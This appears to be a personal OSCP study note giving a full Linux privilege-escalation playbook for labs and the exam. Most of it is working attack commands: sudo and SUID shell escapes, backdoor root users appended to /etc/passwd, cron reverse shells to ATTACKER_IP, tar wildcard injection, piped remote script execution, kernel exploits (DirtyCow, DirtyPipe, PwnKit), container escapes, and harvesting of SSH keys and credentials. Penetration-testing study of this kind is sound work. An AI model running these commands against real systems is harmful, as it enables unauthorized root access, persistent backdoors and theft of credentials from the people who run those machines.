---
tags: [oscp-journey, spectre, stage-1, linux-privesc, privilege-escalation]
module: 1
cert-stage: thm
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 5 — Privilege Escalation/05.1 — Linux PrivEsc"]
netgod-refs: []
---

# S1-14 — Linux Privilege Escalation — Complete Reference

> [!info] Relationship to PHANTOM
> Deep technical content exists in [[PHANTOM/MODULE 5 — Privilege Escalation/05.1 — Linux PrivEsc]]. This note focuses on the **OSCP exam priority order**, the **decision tree when nothing obvious appears**, and **complete exploitation paths** for every technique you will encounter.

## The Mindset — What PrivEsc Actually Is

Privilege escalation is finding a path from your current user to a higher-privileged user — typically root. It is not guessing. It is not brute force. It is **systematic enumeration followed by targeted exploitation**.

The path always exists. If you haven't found it, you haven't finished enumerating. The most common reason people get stuck on PrivEsc is that they skimmed the enumeration output instead of reading every line.

---

## Automated Enumeration Tools — Run These First

### LinPEAS

LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive automated Linux enumeration tool. It checks hundreds of potential escalation vectors and colour-codes output by severity.

**Getting LinPEAS onto the target:**
```bash
# From Kali (serve it):
cp /usr/share/peass/linpeas/linpeas.sh .    # If PEASS is installed
# Or download fresh:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

python3 -m http.server 80

# On target (download and run):
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
curl http://ATTACKER_IP/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Run without writing to disk (in memory):
curl http://ATTACKER_IP/linpeas.sh | bash
```

**Reading LinPEAS output — colour coding:**
- 🔴 **Red/Yellow (95% PE)** — almost certain privilege escalation vector. Investigate immediately.
- 🔴 **Red** — interesting finding, high probability
- 🟡 **Yellow** — notable, worth checking
- 🟢 **Green** — informational

**Key sections to focus on (in order):**
1. `Sudo version` — old sudo versions have vulnerabilities
2. `SUDO` — what can you run as sudo? (most important section)
3. `SUID` — SUID binaries
4. `Capabilities` — process capabilities
5. `Cron jobs` — scheduled tasks running as root
6. `Writable files` — files owned by root that you can write to
7. `NFS exports` — NFS no_root_squash
8. `Interesting files` — SSH keys, config files, history files
9. `Network` — internal services only accessible from localhost

**Save output and read it carefully — never skim LinPEAS:**
```bash
/tmp/linpeas.sh 2>/dev/null | tee /tmp/out.txt
less -r /tmp/out.txt    # -r preserves colour codes
```

---

### pspy64 — Monitor Processes Without Root

pspy captures process creation events in real time without needing root access. Critical for finding cron jobs that don't appear in any crontab file.

```bash
# Serve from Kali:
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
python3 -m http.server 80

# On target:
wget http://ATTACKER_IP/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64

# Watch for UID=0 processes running at regular intervals:
# UID=0     PID=1234   | /bin/sh /opt/cleanup.sh
# UID=0     PID=1235   | /usr/bin/python3 /root/backup.py
```

**What to watch for:**
- Any `UID=0` process (running as root)
- Processes that appear at regular intervals (cron jobs)
- Processes calling scripts you might be able to modify
- Processes calling binaries from unusual paths (PATH hijacking opportunity)

**Run pspy for at least 3–5 minutes** — some cron jobs run every minute, others every 5. Don't give up after 30 seconds.

---

### linuxprivchecker.py — Lightweight Alternative

```bash
wget http://ATTACKER_IP/linuxprivchecker.py -O /tmp/lpc.py
python3 /tmp/lpc.py 2>/dev/null
python /tmp/lpc.py 2>/dev/null     # If Python 3 not available
```

Less comprehensive than LinPEAS but faster and produces more concise output. Use when you want a quick second opinion.

---

## Manual Enumeration Checklist — In Exact Priority Order

Run these manually even after LinPEAS. Automated tools miss things. Do this every time.

### Check 1 — Who Am I?

```bash
whoami          # Current username
id              # UID, GID, and all supplementary groups
```

What to look for in `id` output:
- `uid=0(root)` — you're already root (check if you noticed)
- `groups=` — membership in `docker`, `lxd`, `disk`, `video`, `sudo`, `adm` are all escalation paths

---

### Check 2 — Sudo Rights (MOST IMPORTANT CHECK)

```bash
sudo -l
```

**Possible outputs and what they mean:**

`(ALL : ALL) ALL` — full sudo. Run `sudo su` or `sudo bash` → root immediately.

`(ALL) NOPASSWD: /usr/bin/vim` — can run vim as root without password → GTFOBins.

`(root) NOPASSWD: /usr/bin/find` — same → GTFOBins.

`(ALL) /usr/bin/python3 /opt/script.py` — can run a specific script as root. If you can write to `/opt/script.py`, replace it with a reverse shell.

`sudo: command not found` — sudo isn't installed. Move to next check.

**GTFOBins — the reference for every binary:**
Every binary that has a sudo or SUID escalation path is documented at `gtfobins.github.io`.

**Most common sudo binaries and their exact escalation commands:**

```bash
# vim:
sudo vim -c ':!/bin/sh'
sudo vim -c ':python3 import os; os.system("/bin/bash")'

# nano:
sudo nano
# Then: Ctrl+R → Ctrl+X → reset; bash 1>&0 2>&0

# less/more:
sudo less /etc/passwd
# Then: !bash

# man:
sudo man man
# Then: !bash

# find:
sudo find . -exec /bin/sh \; -quit

# python/python3:
sudo python3 -c 'import os; os.system("/bin/sh")'

# perl:
sudo perl -e 'exec "/bin/sh";'

# ruby:
sudo ruby -e 'exec "/bin/sh"'

# lua:
sudo lua -e 'os.execute("/bin/sh")'

# awk:
sudo awk 'BEGIN {system("/bin/sh")}'

# nmap (older versions):
sudo nmap --interactive
# Then: !sh

# env:
sudo env /bin/sh

# tar:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip:
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh"

# gcc:
sudo gcc -wrapper /bin/sh,-s .

# cp (copy /etc/passwd with your modified version):
sudo cp /tmp/modified_passwd /etc/passwd

# tee (write to files):
echo "hacker:$(openssl passwd password):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
# Then: su hacker → password

# bash (if explicitly listed):
sudo bash
sudo bash -p         # -p = keep SUID/privileged mode

# git:
sudo git -p help config
# Then: !bash

# ftp:
sudo ftp
# Then: !bash

# journalctl:
sudo journalctl
# Then: !bash
```

> [!tip] MUSCLE MEMORY — always check sudo first
> `sudo -l` is the very first thing you run after getting a shell. It takes one second and is the most common OSCP PrivEsc vector. Many Easy machines are intentionally solved via `sudo -l` → GTFOBins.

---

### Check 3 — SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
```

**Cross-reference every result against GTFOBins → SUID section.**

**Most common exploitable SUID binaries:**

```bash
# bash (if SUID set — extremely rare but instant root):
/bin/bash -p                # -p = preserve SUID privileges → root shell

# find:
find . -exec /bin/sh -p \; -quit

# vim:
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# python/python3:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl:
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh";'

# cp (copy /etc/passwd with root backdoor):
echo "hacker::0:0::/root:/bin/bash" >> /tmp/passwd_copy
cp /tmp/passwd_copy /etc/passwd    # If cp has SUID
su hacker                          # No password — UID 0

# nmap (SUID + older version with --interactive):
nmap --interactive
!sh

# less:
less /etc/passwd
!sh

# more:
TERM=dumb more /etc/passwd
!sh

# man:
man man
!sh

# env:
env -i /bin/sh -p

# awk:
awk 'BEGIN {system("/bin/sh -p")}'

# tee:
echo "hacker::0:0::/root:/bin/bash" | tee -a /etc/passwd

# xxd (read any file):
xxd /root/.ssh/id_rsa | xxd -r    # Read root's SSH key

# base64 (read any file):
base64 /root/root.txt | base64 -d  # Exfil root flag

# dd (read/write arbitrary):
dd if=/etc/shadow                   # Read shadow
echo "backdoor" | dd of=/etc/passwd append   # Write

# pkexec (CVE-2021-4034 — PwnKit):
# If pkexec has SUID and is vulnerable version:
git clone https://github.com/ly4k/PwnKit
cd PwnKit && ./install   # Instant root
```

> [!warning] Not all SUID binaries are exploitable
> Standard system SUID binaries like `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/mount` are SUID by design and not vulnerabilities. Focus on non-standard SUID binaries or well-known exploitable ones (bash, find, python, vim).

---

### Check 4 — Capabilities

Linux capabilities are a fine-grained privilege system that grants specific root-level abilities to binaries without making them full SUID.

```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities and their exploitation:**

```bash
# cap_setuid — allows setting UID to 0:
# python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid:
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# vim with cap_setuid:
# (run vim, then :py3 import os; os.setuid(0); os.system('/bin/bash'))

# cap_dac_read_search — bypass file read permission checks:
# openssl with this cap can read any file:
openssl enc -in /root/.ssh/id_rsa     # Read root SSH key

# cap_net_raw — raw socket access:
# Less directly useful for privesc, but allows packet sniffing

# cap_net_bind_service — bind to ports < 1024:
# Allows binding to privileged ports — less useful for privesc

# cap_sys_ptrace — debug any process (like SeDebugPrivilege on Windows):
# Attach to a root-owned process and inject shellcode
```

---

### Check 5 — Cron Jobs

```bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l                          # Current user's cron
cat /var/spool/cron/crontabs/*      # All users (needs read access)
```

**Exploitation paths from cron jobs:**

**Path 1 — Writable script:**
```bash
# Cron runs: * * * * * root /opt/cleanup.sh
ls -la /opt/cleanup.sh              # Check permissions
# If writable by you:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/cleanup.sh
# Wait 1 minute for cron to execute → root reverse shell
```

**Path 2 — Script calls a binary without full path (PATH hijacking):**
```bash
# cleanup.sh contains: python script.py (no full path)
# Check $PATH in the cron environment
# If a directory in PATH is writable:
echo $PATH
find / -writable -type d 2>/dev/null | grep -E "^(/usr/local/bin|/opt|/home)"
# Create malicious "python" in that directory:
cat > /writable/path/python << EOF
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
EOF
chmod +x /writable/path/python
# Wait for cron → executes your python → root shell
```

**Path 3 — Wildcard injection (tar, rsync, chown):**
```bash
# Cron: * * * * * root tar czf /backup.tar.gz /opt/files/*
# The * wildcard passes filenames as arguments to tar
# Create files with argument-like names in /opt/files/:
touch '/opt/files/--checkpoint=1'
touch '/opt/files/--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash' > /opt/files/shell.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /opt/files/shell.sh
chmod +x /opt/files/shell.sh
# When cron runs tar with *, the filenames become: 
# tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh czf /backup.tar.gz
# tar executes shell.sh as root

# rsync wildcard injection:
touch '/opt/files/-e sh shell.sh'

# chown wildcard injection:
touch '/opt/files/--reference=shell.sh'
```

---

### Check 6 — Writable Files

```bash
# World-writable files:
find / -perm -o+w -type f 2>/dev/null | grep -v proc | grep -v sys

# Files owned by root but writable by you:
find / -user root -writable -type f 2>/dev/null | grep -v proc

# Writable directories (can create files here):
find / -writable -type d 2>/dev/null | grep -v proc

# Particularly dangerous writable locations:
# - /etc/passwd (can add root user)
# - /etc/crontab (can add root cron job)
# - /etc/cron.d/* (same)
# - Scripts called by cron
# - Scripts called by services running as root
```

**If /etc/passwd is writable:**
```bash
# Generate a password hash:
openssl passwd -1 -salt hacker password123    # MD5 hash
openssl passwd password123                    # MD5 (default)
python3 -c "import crypt; print(crypt.crypt('password123', crypt.mksalt(crypt.METHOD_SHA512)))"

# Append root-level user:
echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                         # Password: password123

# Or clear the password field (no password needed):
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker                         # Just press Enter
```

---

### Check 7 — Environment Variables and History

```bash
env                                 # Current environment variables
cat ~/.bash_history                 # Command history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
history                             # Same as bash_history

# What to look for:
# - Passwords in env vars: DB_PASSWORD=, SECRET_KEY=, API_KEY=
# - Commands with credentials: mysql -u root -psecretpassword
# - SSH commands revealing other hosts and users
# - sudo commands showing what root does
```

---

### Check 8 — Configuration Files with Passwords

```bash
# Recursive search for keywords in config files:
grep -r "password" /etc/ 2>/dev/null | grep -v "#" | grep -v Binary
grep -r "password" /var/www/ 2>/dev/null | grep -v Binary
grep -r "PASSWORD" /opt/ 2>/dev/null | grep -v Binary

# Common locations:
cat /var/www/html/wp-config.php           # WordPress
cat /var/www/html/config.php              # Generic PHP
cat /var/www/html/.env                    # Laravel/Django
cat /etc/mysql/my.cnf                     # MySQL credentials
cat /etc/phpmyadmin/config.inc.php
cat /root/.my.cnf                         # MySQL root credentials

# Find all .conf, .config, .ini files:
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

### Check 9 — Listening Services (Internal Only)

```bash
ss -tulpn                           # All listening services
ss -tulpn | grep 127.0.0.1          # Only localhost services
netstat -tulpn 2>/dev/null | grep LISTEN
```

Services listening only on `127.0.0.1` (localhost) are invisible from outside but accessible from the compromised machine. These are often:
- Web applications with weaker authentication
- Databases without auth (Redis, MongoDB)
- Admin interfaces
- Internal APIs

**Forward localhost services to your attacker machine:**
```bash
ssh -L 8080:127.0.0.1:8080 user@TARGET    # Forward target's localhost:8080 to your machine
# Then browse: http://127.0.0.1:8080
```

---

### Check 10 — NFS Exports

```bash
showmount -e TARGET                        # From Kali — see exported shares
cat /etc/exports                           # On target — see share config
```

**no_root_squash exploitation:**
By default, NFS maps root on the client to `nobody` on the server (root_squash). If `no_root_squash` is set, root on the client IS root on the server.

```bash
# On target — check for no_root_squash:
cat /etc/exports
# /opt/share *(rw,no_root_squash) ← vulnerable

# On Kali (as root):
showmount -e TARGET
mkdir /tmp/nfs_mount
sudo mount -t nfs TARGET:/opt/share /tmp/nfs_mount

# Since no_root_squash is set, root on Kali = root on target:
sudo cp /bin/bash /tmp/nfs_mount/bash
sudo chmod 4755 /tmp/nfs_mount/bash         # Set SUID bit as root

# Back on target:
/opt/share/bash -p                          # Runs as root
```

---

### Check 11 — Kernel Version

```bash
uname -r                            # Kernel version
uname -a                            # Full system info
cat /etc/os-release                 # Distribution and version
```

**Search for kernel exploits:**
```bash
searchsploit linux kernel 4.15     # Search by kernel version
searchsploit ubuntu 18.04 local privilege

# Key kernel exploits you should know:
# DirtyPipe: CVE-2022-0847 — Linux 5.8 to 5.16
# PwnKit:    CVE-2021-4034 — pkexec, all Linux distributions
# DirtyCow:  CVE-2016-5195 — Linux < 4.8.3 (old but still on legacy boxes)
# OverlayFS: CVE-2021-3493 — Ubuntu specific
```

**DirtyCow (CVE-2016-5195) — Linux kernel < 4.8.3:**
```bash
searchsploit dirtycow
searchsploit -m exploits/linux/local/40839.c

gcc -pthread 40839.c -o dirtycow -lcrypt
./dirtycow
# Modifies /etc/passwd to create firefart user with root access
su firefart    # Password: dirtycow
```

**DirtyPipe (CVE-2022-0847) — Linux 5.8 to 5.16.11:**
```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
gcc -o exploit1 exploit-1.c
./exploit1 /usr/bin/sudo        # Overwrites SUID binary with shell
# Then:
/tmp/sh -p                      # Root shell
```

**PwnKit (CVE-2021-4034) — pkexec in virtually all Linux distros:**
```bash
# Check pkexec version:
pkexec --version
ls -la /usr/bin/pkexec           # Must be SUID

# Exploit:
git clone https://github.com/ly4k/PwnKit
cd PwnKit
sh ./install.sh                  # Instant root
```

> [!danger] Kernel exploits are the last resort
> Kernel exploits can crash or destabilise the target system. On a real engagement, this can cause outages. On OSCP, a crashed machine means losing your progress until it reboots. Always exhaust sudo/SUID/cron/capability paths before touching kernel exploits.

---

### Check 12 — Special Group Memberships

If `id` shows membership in unusual groups:

**docker group:**
```bash
# Any member of docker group can get root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Mounts the entire host filesystem inside a container as root
```

**lxd/lxc group:**
```bash
# Full LXD exploitation chain:
# Step 1 (on Kali): build a minimal Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine

# Transfer alpine.tar.gz to target
# Step 2 (on target):
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite -- /bin/sh
# Now inside container with host filesystem at /mnt/root:
cat /mnt/root/root/root.txt     # Read root flag directly
cp /mnt/root/bin/bash /mnt/root/tmp/bash
chmod 4777 /mnt/root/tmp/bash
exit
/tmp/bash -p                    # Root shell on host
```

**disk group:**
```bash
# Members of disk can read/write raw disk — bypass all file permissions:
# Find the device for /:
df -h /                          # Shows /dev/sda1 or similar
# Use debugfs to read any file:
debugfs /dev/sda1
# Inside debugfs:
cat /root/.ssh/id_rsa            # Read root's SSH key
cat /root/root.txt               # Read root flag
```

**adm group:**
```bash
# Can read most log files in /var/log:
cat /var/log/auth.log            # SSH logins, sudo attempts — may reveal passwords
cat /var/log/syslog
# Look for credentials in logs
```

**video group:**
```bash
# Can access framebuffer — screenshot the screen:
cp /dev/fb0 /tmp/fb.raw         # Capture framebuffer
# Transfer to Kali and view with GIMP or ffmpeg
```

---

## Credential Harvesting After Foothold

Before running PrivEsc exploits, always check if credentials are lying around:

```bash
# SSH keys:
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null | grep -v proc

# Application config files:
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password\|passwd\|db_pass" 2>/dev/null

# Database credentials in PHP:
grep -r "db_password\|DB_PASSWORD\|mysql_pass\|database_password" /var/www/ 2>/dev/null

# .env files (Laravel, Django, Node.js):
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# Check mail spool for credentials sent via email:
cat /var/mail/*
ls /var/spool/mail/
```

---

## The PrivEsc Decision Tree — When Nothing Is Obvious

Use this when LinPEAS didn't scream at you and manual checks didn't reveal an obvious path:

```
1. Have you ACTUALLY read all of LinPEAS output? (not skimmed)
   → If no: read it again, line by line

2. Did you run pspy64 and wait 5+ minutes?
   → If no: run it and watch for UID=0 processes

3. Did you check every binary in sudo -l against GTFOBins?
   → If no: check every single one

4. Did you check all SUID binaries against GTFOBins?
   → If no: check every single one

5. Have you read every configuration file in /var/www/?
   → Credentials found there often allow: su to another user, SSH
      as another user, or login to a local database

6. Have you checked .bash_history for all users you can read?
   → cat /home/*/.bash_history 2>/dev/null

7. Have you checked ss -tulpn for localhost-only services?
   → Is there a web app, database, or API only accessible internally?

8. Have you checked /etc/exports for NFS no_root_squash?

9. Have you checked id for unusual group memberships (docker, lxd, disk)?

10. What is the kernel version? Is it vulnerable?
    → searchsploit linux kernel $(uname -r | cut -d- -f1)

11. Have you tried the credentials you found anywhere else?
    → Credential reuse: try found passwords with su, SSH, sudo
    → Try every password found against every user in /etc/passwd
```

---

## OSCP Exam PrivEsc Strategy

**Time budget for PrivEsc:**
- Easy Linux machine: ≤ 30 minutes. If sudo or SUID doesn't yield in 30 min, check for missed enumeration.
- Medium Linux machine: ≤ 45 minutes. More complex path expected.
- Hard machine: ≤ 60 minutes. May require chaining multiple techniques.

**Priority order on exam:**
```
1. sudo -l → GTFOBins (30 seconds to check)
2. SUID → find / -perm -4000 → GTFOBins (2 minutes)
3. LinPEAS (10 minutes — let it run while you enumerate manually)
4. Cron jobs → pspy64 (5 minutes)
5. Capabilities → getcap -r / (1 minute)
6. Writable /etc/passwd (instant check)
7. NFS exports (1 minute)
8. Interesting files / credentials (5 minutes)
9. Internal services (2 minutes)
10. Kernel exploit (last resort)
```

**If stuck after 25 minutes:**
- Restart enumeration from scratch — you missed something
- Re-read LinPEAS output
- Check if there's a second user you should lateral move to first
- Look for custom SUID binaries that aren't on GTFOBins — check their source or behavior manually

---

## Quick Reference — All PrivEsc Commands

```bash
# Identity:
whoami; id; groups

# Sudo:
sudo -l
sudo -V                             # Sudo version (CVE check)

# SUID:
find / -perm -4000 -type f 2>/dev/null

# SGID:
find / -perm -2000 -type f 2>/dev/null

# Capabilities:
getcap -r / 2>/dev/null

# World-writable:
find / -perm -o+w -type f 2>/dev/null | grep -v proc | head -20

# Cron:
cat /etc/crontab; ls /etc/cron.d/; crontab -l

# NFS:
showmount -e TARGET                 # From Kali
cat /etc/exports                    # On target

# Kernel:
uname -r; uname -a

# Groups (exploitable):
id | grep -E "docker|lxd|disk|adm|video"

# Internal services:
ss -tulpn | grep 127

# History and env:
cat ~/.bash_history; env; history

# Password search:
grep -r "password" /var/www/ 2>/dev/null | grep -v Binary | grep -v ".js:"

# SSH keys:
find / -name "id_rsa" 2>/dev/null

# Interesting files:
find / -name "*.txt" -o -name "*.kdbx" -o -name "*.zip" 2>/dev/null | grep -v proc | grep -v sys
```

---

## Common Mistakes

> [!warning] These keep people stuck on PrivEsc for hours
> 1. **Skimming LinPEAS instead of reading it.** The answer is often in a yellow line you scrolled past. Read every highlighted line.
> 2. **Not running pspy64.** Many OSCP machines have cron-based PrivEsc that doesn't appear in any crontab. pspy64 is non-negotiable.
> 3. **Checking sudo -l but not cross-referencing GTFOBins.** Every binary that appears in `sudo -l` must be looked up on GTFOBins, even if it seems harmless.
> 4. **Ignoring unusual group memberships.** `id` shows `docker` in the groups → instant root. Many beginners don't recognise docker/lxd/disk as privilege escalation paths.
> 5. **Using kernel exploits first.** They should be last. They crash systems. A crashed OSCP machine costs you time and points.
> 6. **Not checking /etc/passwd writability.** If you can write to /etc/passwd, you have root in 10 seconds. This check takes 2 seconds: `ls -la /etc/passwd`.
> 7. **Not trying credential reuse.** The password in `wp-config.php` might be the root password. Try it with `su root`, `sudo -s`, SSH as other users.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Linux PrivEsc" room | Every technique in this note — guided labs |
| TryHackMe — "Linux PrivEsc Arena" | Challenge-based — no guidance |
| TryHackMe — "Common Linux Privesc" | Beginner-focused explanations |
| HTB — Bashed | sudo -l → scriptmanager → cron → root |
| HTB — Shocker | Shellshock → sudo perl → root |
| HTB — Beep | Multiple paths — good for exploring options |
| HTB — Cronos | Cron job exploitation classic |
| HTB — Nibbles | sudo -l → nibbleblog → reverse shell → sudo |
| VulnHub — Kioptrix series | Classic Linux PrivEsc practice machines |
| GTFOBins (gtfobins.github.io) | Reference for every SUID and sudo binary — memorise the most common |
| HackTricks (book.hacktricks.xyz) | Linux PrivEsc checklist — comprehensive backup reference |
| [[PHANTOM/MODULE 5 — Privilege Escalation/05.1 — Linux PrivEsc]] | Full technical depth in PHANTOM vault |
